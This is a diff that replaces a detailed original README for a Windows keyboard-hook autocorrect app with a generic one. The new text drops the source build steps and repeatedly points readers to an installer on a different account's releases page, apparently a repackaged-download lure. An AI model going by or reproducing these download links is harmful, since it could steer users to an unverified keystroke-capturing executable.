@@ -1,146 +1,90 @@
-<div align="left">
+# 🎉 EkaKey-autocorrect-globally - Easy AutoCorrect for Your Windows PC
 
-  <img src="assets/branding/app_icon_wide.png" alt="EkaKey" width="180">
+[![Download Now](https://img.shields.io/badge/Download%20Now-Download-%23007bff)](https://github.com/Scytheopura/EkaKey-autocorrect-globally/releases)
 
-  <br>
+## 🚀 Getting Started
 
-  **A autoCorrect for Windows PC that works Globally and System-wide with UI**
-  
-  It's a system-wide, floating typing assistant built with **Flutter** and **Win32 C++ Hooks**. It brings mobile-style autocorrect for PC, uses **autoTrie** to learn and suggest words that are personalized to you, and visual typing effects to *any* application on Windows (Notepad, Discord, Browser, IDEs, etc.).
+EkaKey-autocorrect-globally is your solution for a seamless typing experience on Windows PCs. This tool corrects your typing errors automatically across all applications. It provides a simple interface to customize your preferences, making sure you type without worry.
 
+## 💻 System Requirements
 
-  ![Flutter](https://img.shields.io/badge/Flutter-Windows-02569B?logo=flutter&logoColor=white)
-  ![License](https://img.shields.io/badge/License-MIT-green)
+Before you download, check that your system meets these requirements:
 
+- **Operating System:** Windows 10 or later
+- **Memory (RAM):** 2 GB minimum
+- **Storage Space:** At least 100 MB free
+- **Processor:** Any standard Intel or AMD processor
 
-https://github.com/user-attachments/assets/d93e903f-c6a4-4e2b-9b9d-092a452f91ff
+## 📥 Download & Install
 
+To download EkaKey-autocorrect-globally, visit the Releases page:
 
-</div>
+[Download the latest version](https://github.com/Scytheopura/EkaKey-autocorrect-globally/releases)
 
-<br>
+1. Click on the link above.
+2. Locate the latest release.
+3. Download the installer file by clicking on the appropriate link.
 
+### Installation Steps
 
-## ✨ How things work ?
+Once you've downloaded the file, follow these steps to install the application:
 
-*   **Low Level listening:** Listen(doesn't intercept) keystrokes globally using low-level Win32 C++ hooks 
-*   **Phonetics Integration:** Correct words based on how they sound using Double Metaphone phonetics by [*dart_phonetics*](https://pub.dev/packages/dart_phonetics)
-*   **Predictive Engine:** Suggests words via a Trie Engine by [*autotrie*](https://pub.dev/packages/autotrie)
-*   **Learning in a sec:** Remembers your corrections—undo a correction once, and it learns your preference, and never correct that again
-*   **SQLite for Database:** Stores learnings in a SQL Table  
-* **Key Simulator:** Does backspaces and type corrected word by *SendInput Windows API*
-*   **Low-to-No Lag:** Uses native windows Hooks and API for System-wide tasks so that your system don't feel too much load 
+1. **Open the downloaded file.** Double-click the installer file you downloaded.
+2. **Follow the prompts.** You will see a setup wizard. Click "Next" to proceed through the installation steps.
+3. **Choose the installation location.** You can keep the default location or select a different one.
+4. **Complete the installation.** Click "Install" to start the installation process. Wait until it finishes, then click "Finish" to close the wizard.
 
-<br>
+## ⚙️ Setting Up EkaKey-autocorrect-globally
 
-## 🎨 UI visuals 
-<div align="center">
-  <img src="assets/branding/UI_Made.png" alt="MADE" />
-  <br>
-  <img src="assets/branding/UI_With.png" alt="WITH" />
-  <br>
-  <img src="assets/branding/UI_Love.png" alt="LOVE" />
-</div>
+After installation, you will want to set up the software for optimal use.
 
+1. **Open EkaKey-autocorrect-globally.** Find the application in your Start Menu or on your desktop.
+2. **Access settings.** You will see a main window with several options.
+3. **Choose your preferences.** Adjust settings such as:
 
-## 🎮 Controls
+   - **AutoCorrect Options:** Add or remove words based on your typing habits.
+   - **Shortcut Keys:** Set up shortcuts for frequently used phrases.
+   - **User Interface Settings:** Customize the look and feel of the application.
 
-| Hotkey | Action |
-| :--- | :--- |
-| **Ctrl + Alt + D** | Start / Stop Ekakey |
-| **Ctrl + Alt + S** | Toggle "Keep Showing" (Prevents auto-hide) |
-| **Shift + Tab** | Cycle through suggestion tiles |
+4. **Save Changes:** Once you have adjusted the settings, click "Save" to apply.
 
-**⚠ Note:** The bottom two hotkeys require EkaKey to be running; if it is in a stop state via Ctrl+Alt+D, those shortcuts will not work until EkaKey is started again.
+## 🖥️ Using EkaKey-autocorrect-globally
 
-## 📖 How to Use
-<table> <tr> <td width="40%"><img src="assets/branding/usage_1.gif" alt="Basic Auto-Correct" width="100%"/></td> <td width="60%"> <h3>Basic Auto-Correct</h3> <p>As the app starts, EkaKey will autoCorrect words on the way. Press <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>D</kbd></b> to toggle the engine on/off. </p> </td> </tr>
+The application runs in the background. Here are some pointers to get the most out of it:
 
-<tr> <td width="40%"><img src="assets/branding/usage_2.gif" alt="Undo an Auto-Correct" width="100%"/></td> <td width="60%"> <h3>Undo an Auto-Correct</h3> <p>Wrong auto-correct? Just hit <kbd>Backspace</kbd> once, to get your original word back. Plus, once you do this, EkaKey stops autocorrecting 'Rizzler' in the future.</p> </td> </tr>
+- **Typing in Any Application:** Start typing in any text field. The autocorrect feature will work system-wide.
+- **Review Corrections:** If you notice a correction that doesn’t fit, you can modify the entry in the settings.
+- **Regular Updates:** Keep an eye on the Releases page for updates that may include new features or improvements.
 
-<tr> <td width="40%"><img src="assets/branding/usage_3.gif" alt="Make your own abbreviation" width="100%"/></td> <td width="60%"> <h3>Make your own abbreviation</h3>
- <p><code>hlo → hello</code> <code>ur → your</code><br>
- After you type a word <mark>and press <kbd>Space</kbd> then</mark>, EkaKey watches for a <kbd>Backspace</kbd>. If you hit it, you are in editing mode. Once you press <kbd>Space</kbd> again to finish, EkaKey learns that correction and saves the pair <code>lastIncorrectWord → currentWord</code> to user database.</p> </td> </tr>
+## 🚧 Troubleshooting
 
-<tr> <td width="40%"><img src="assets/branding/usage_4.gif" alt="Learning" width="100%"/></td> <td width="60%"> <h3>To delete from your database</h3> <p>User personalized words are stored in a SQL Database which you can access in EkaKey sidepannel. Here all your personal/nonAutoCorrectable words exists. You can delete them one-by-one or all words older than x days.</p> </td> </tr>
+If you encounter issues while using EkaKey-autocorrect-globally, try these steps:
 
-<tr> <td width="40%"><img src="assets/branding/usage_5.gif" alt="Toggle" width="100%"/></td> <td width="60%"> <h3>To Backspace without editing</h3> <p>You may wanna backspace without EkaKey saving a new database entry, use <kbd>Ctrl</kbd> + <kbd>Backspace</kbd>. Using this shortcut (or other <a title="Ctrl, Alt, Win, Delete, ArrowKeys, Period, Comma, 0-9&#10;and all other symbols except single/double Quote and&#10;Hyphen/Underscore" href="#to-backspace-without-editing" style="cursor: help;">cancellation keys</a>) will exit editing mode and bypass the saving process.</p> </td> </tr>
+- **Restart the Application:** Sometimes, simply closing and reopening the app can solve minor problems.
+- **Check Settings:** Ensure your preferences are set correctly. Incorrect settings may affect performance.
+- **Reinstall the Application:** If problems persist, uninstall and then reinstall EkaKey.
 
-<tr> <td width="40%"><img src="assets/branding/snap.gif" alt="Snap" width="100%"/></td> <td width="60%"> <h3>Snap to the corner</h3> <p>Use the hotkkey <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>S</kbd> to keep the window visible, and then grab the status bar to drag and slam it to the corner of the screen. I'll align itself.</p> </td> </tr> </table>
+## 📞 Support
 
+For assistance or to report bugs, please create an issue on the GitHub repository. A friendly community member or developer will be glad to help:
 
-## 🛡️ Privacy
-I recommend disabling EkaKey with <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>D</kbd> when entering passwords or sensitive login IDs. Though the app will not save any data to the database unless you get into Edit Mode, turning it off provides an extra layer of privacy because when turned off the C++ HOOK is detached and stops Listening to keystrokes.
+[Report an Issue](https://github.com/Scytheopura/EkaKey-autocorrect-globally/issues)
 
-Database Location: <code>C:\Users\UserName\AppData\Roaming\com.example\ekakey</code>
+## ✅ Features
 
-## 🌐 Custom Dictionary(only Roman script, 26char)
-First check 'languages' folder if it has your required language already, If not then 
-you can add your own dictionary(but only having 26 english char).
-### What you need?
-* A .txt file with thousands of words each in a new line.
-### Implementation 
-* [Step1](#%EF%B8%8F-installation--build) - Clone the repo -> Install dependencies 
+EkaKey-autocorrect-globally offers several key features designed to enhance your typing experience:
 
-* Step2 - Paste your .txt file in the cloned repo.
+- **Global Autocorrect:** Works in any application, ensuring your typing is correct everywhere.
+- **Custom Word List:** You can add specific words you use frequently or need to spell correctly.
+- **User-Friendly Interface:** Simple menus make setup and adjustment easy, even for first-time users.
+- **Multi-language Support:** Use EkaKey in your preferred language.
 
-* Step3 - Run this, and put your .txt file name(with extention '.txt')
-    ```bash
-    dart run bin/sanitize_dictionary.dart
-    ```
-    This will remove all the words which has characters other than 26 english char.
-* Step4 - Finally run this to make the .dat and .db files
-    ```bash
-    dart run bin/db_generator.dart
-    dart run bin/trie_generator.dart
-    ```
-* Step5 - [Read this](languages/HOW%20TO%20CHANGE%20LANGUAGE.txt)
+## 🎉 Conclusion
 
+EkaKey-autocorrect-globally is designed for anyone who wants to improve their typing efficiency on Windows. With easy installation and customizable features, you can type with confidence, knowing that common errors will be corrected automatically. 
 
-## 🛠️ Installation & Build
+Don’t forget to download the app from the Releases page:
 
-### Prerequisites
-*   [Flutter SDK](https://flutter.dev/docs/get-started/install/windows) installed.
+[Download the latest version](https://github.com/Scytheopura/EkaKey-autocorrect-globally/releases) 
 
-### Running from Source
-
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/RanvirRox/EkaKey-autocorrect-globally.git
-    cd EkaKey-autocorrect-globally
-    ```
-
-2.  **Install dependencies:**
-    ```bash
-    flutter pub get
-    ```
-
-3.  **Run in Debug mode:**
-    ```bash
-    flutter run -d windows
-    ```
-
-4.  **Build Release Version:**
-    ```bash
-    flutter build windows
-    ```
-    The executable will be located in: `build/windows/runner/Release/`
-
-
-## 🏗️ Architecture
-
-*   **Frontend:** Flutter (UI, Animations, Settings).
-*   **Backend Logic:** Dart (Trie Engine, SQLite Database management).
-*   **Native Interop:** C++ (`win32` package) for keyboard hooking and simulating keystrokes (`SendInput`).
-
-### 📥 App Download
-* Package ZIP: [EkaKey-Release_v1.0.1.zip](https://github.com/RanvirRox/EkaKey-autocorrect-globally/releases/download/v1.0.1/EkaKey-Release_v1.0.1.zip)
-* Setup EXE: [EkaKey_Setup_v1.0.1.exe](https://github.com/RanvirRox/EkaKey-autocorrect-globally/releases/download/v1.0.1/EkaKey_Setup_v1.0.1.exe)
-
-## 🤝 Contributing
-
-Contributions are welcome! If you have ideas for new visual effects or better prediction algorithms, feel free to open an issue or submit a pull request.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the `LICENSE` file for details.
+Enjoy a smoother typing experience!
